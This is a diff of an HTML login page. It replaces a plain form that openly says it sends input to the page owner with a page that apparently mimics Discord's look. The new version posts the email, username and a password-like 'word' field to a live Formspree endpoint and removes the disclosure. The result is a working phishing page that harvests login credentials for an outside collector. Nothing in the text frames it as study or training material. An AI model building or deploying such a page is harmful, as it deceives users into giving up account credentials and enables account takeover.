@@ -1,117 +1,77 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Login</title>
-  <style>
-    :root{
-      --bg:#0b1020; --card:#121a33; --text:#e9eeff; --muted:#a9b3d6;
-      --border:#263055; --btn:#3b82f6; --btn2:#1d4ed8;
-    }
-    *{box-sizing:border-box;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial}
-    body{
-      margin:0; min-height:100vh; display:grid; place-items:center;
-      background: radial-gradient(1200px 600px at 50% 0%, #23306a 0%, var(--bg) 60%);
-      color:var(--text);
-      padding:24px;
-    }
-    .card{
-      width:min(420px, 100%);
-      background:linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.03));
-      border:1px solid var(--border);
-      border-radius:14px;
-      padding:26px;
-      box-shadow:0 18px 60px rgba(0,0,0,.35);
-      backdrop-filter: blur(6px);
-    }
-    h1{margin:0 0 6px;font-size:26px}
-    p{margin:0 0 18px;color:var(--muted);font-size:14px}
-    label{display:block;margin:12px 0 6px;font-size:12px;color:var(--muted);letter-spacing:.2px}
-    input{
-      width:100%;
-      padding:12px 12px;
-      background:#0f1530;
-      border:1px solid var(--border);
-      border-radius:10px;
-      color:var(--text);
-      outline:none;
-    }
-    input:focus{border-color:#4f7cff; box-shadow:0 0 0 3px rgba(79,124,255,.18)}
-    .btn{
-      margin-top:16px;
-      width:100%;
-      padding:12px;
-      border:none;
-      border-radius:10px;
-      background:linear-gradient(180deg,var(--btn),var(--btn2));
-      color:white;
-      font-weight:600;
-      cursor:pointer;
-    }
-    .small{margin-top:10px;font-size:12px;color:var(--muted);text-align:center}
-    .ok,.err{margin-top:10px;font-size:13px;display:none}
-    .ok{color:#86efac}
-    .err{color:#fca5a5}
-  </style>
+<meta charset="UTF-8">
+<title>Login</title>
+<style>
+body{
+  background:#5865F2;
+  font-family:Arial, sans-serif;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+}
+.box{
+  background:#2c2f33;
+  padding:25px;
+  border-radius:8px;
+  width:320px;
+  color:#fff;
+}
+.box h2{
+  text-align:center;
+  margin-bottom:15px;
+}
+label{
+  font-size:12px;
+  color:#b9bbbe;
+}
+input{
+  width:100%;
+  padding:8px;
+  margin:6px 0 12px;
+  border:none;
+  border-radius:4px;
+}
+button{
+  width:100%;
+  padding:10px;
+  background:#5865F2;
+  border:none;
+  color:white;
+  font-size:16px;
+  border-radius:4px;
+  cursor:pointer;
+}
+.success{
+  text-align:center;
+  color:#43b581;
+  display:none;
+}
+</style>
 </head>
+
 <body>
-  <div class="card">
-    <h1>Log in</h1>
-    <p>Enter your details below.</p>
+<div class="box">
+  <h2>Log In</h2>
 
-    <!-- IMPORTANT: Replace action URL with your Formspree endpoint -->
-    <form id="loginForm" action="https://formspree.io/f/YOUR_ID" method="POST">
-      <label for="email">Email</label>
-      <input id="email" name="email" type="email" required autocomplete="email" />
+  <form action="https://formspree.io/f/mqekqdqq" method="POST"
+        onsubmit="document.getElementById('ok').style.display='block'">
 
-      <label for="username">Username</label>
-      <input id="username" name="username" type="text" required autocomplete="username" />
+    <label>Email</label>
+    <input type="email" name="email" required>
 
-      <label for="word">Word</label>
-      <input id="word" name="word" type="text" required />
+    <label>Username</label>
+    <input type="text" name="username" required>
 
-      <!-- optional extra info -->
-      <input type="hidden" name="_subject" value="New login form submission" />
-      <input type="hidden" name="page" value="login" />
+    <label>Word</label>
+    <input type="text" name="word" required>
 
-      <button class="btn" type="submit">Log In</button>
+    <button type="submit">Log In</button>
+  </form>
 
-      <div class="ok" id="okMsg">Sent successfully.</div>
-      <div class="err" id="errMsg">Something went wrong. Try again.</div>
-
-      <div class="small">This form sends your input to the owner of this page.</div>
-    </form>
-  </div>
-
-  <script>
-    // Optional: submit with fetch so it doesn't leave the page
-    const form = document.getElementById('loginForm');
-    const ok = document.getElementById('okMsg');
-    const err = document.getElementById('errMsg');
-
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      ok.style.display = 'none';
-      err.style.display = 'none';
-
-      try {
-        const res = await fetch(form.action, {
-          method: 'POST',
-          body: new FormData(form),
-          headers: { 'Accept': 'application/json' }
-        });
-
-        if (res.ok) {
-          ok.style.display = 'block';
-          form.reset();
-        } else {
-          err.style.display = 'block';
-        }
-      } catch {
-        err.style.display = 'block';
-      }
-    });
-  </script>
+  <p id="ok" class="success">Data sent successfully ✅</p>
+</div>
 </body>
 </html>
